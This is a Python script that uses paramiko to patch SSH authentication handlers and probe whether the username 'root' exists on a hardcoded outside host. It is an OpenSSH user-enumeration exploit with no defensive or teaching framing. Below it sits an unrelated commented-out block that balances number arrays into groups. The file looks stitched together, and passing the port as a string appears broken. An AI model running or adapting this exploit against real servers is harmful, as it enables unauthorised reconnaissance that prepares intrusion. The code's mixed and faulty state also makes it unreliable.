import argparse
import logging
import paramiko
import socket
import sys


class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass


old_service_accept = paramiko.auth_handler.AuthHandler[paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

def userauth_failure(*args, **kwargs):
    raise InvalidUsername()

paramiko.auth_handler.AuthHandler._handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
})

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

# arg_parser = argparse.ArgumentParser()
# arg_parser.add_argument('hostname', type=str)
# arg_parser.add_argument('--port', type=int, default=22)
# arg_parser.add_argument('username', type=str)
# args = arg_parser.parse_args()

sock = socket.socket()
try:
    sock.connect(("fvsport.com", "22"))
except socket.error:
    print('[-] Failed to connect')
    sys.exit(1)

transport = paramiko.transport.Transport(sock)
try:
    transport.start_client()
except paramiko.ssh_exception.SSHException:
    print('[-] Failed to negotiate SSH transport')
    sys.exit(2)

try:
    transport.auth_publickey("root", paramiko.RSAKey.generate(2048))
except InvalidUsername:
    print('[*] Invalid username')
    sys.exit(3)
except paramiko.ssh_exception.AuthenticationException:
    print('[+] Valid username')
# import math
# arr = [7611290288,29696,24540738121,679936,111616];     counts = 4;                 sum = 0
# for el in arr:sum += el;
# print("sum="+str(sum));             print("threads="+str(counts))
# avg = sum/counts;                   print("avg="+str(avg));
# got = False;                        ar2 = [];                   i=0;
# while i<counts:                     ar2.append([]);             i+=1;
#
# def take(arr):
#     t=arr[0];
#     del arr[0];
#     return t
# y=0;step=0
#
# def arsum(arr):
#     sm = 0
#     for el in arr:sm+=el
#     return sm
#
# while len(arr)>0:
#     d = 0
#     for el2 in arr:
#         dd = arsum(ar2[step]) + el2 - avg
#         print("avg-arsum+elem="+str(dd))
#     x=take(arr)
#     ar2[step].append(x)
#     y+=x
#     if y>avg:
#         y=0;step+=1
# print(str(ar2))
#
# for elems in ar2:
#     sum=0
#     for elem in elems:
#         sum+=elem
#     print("arr "+str(elems)+" = "+str(sum))
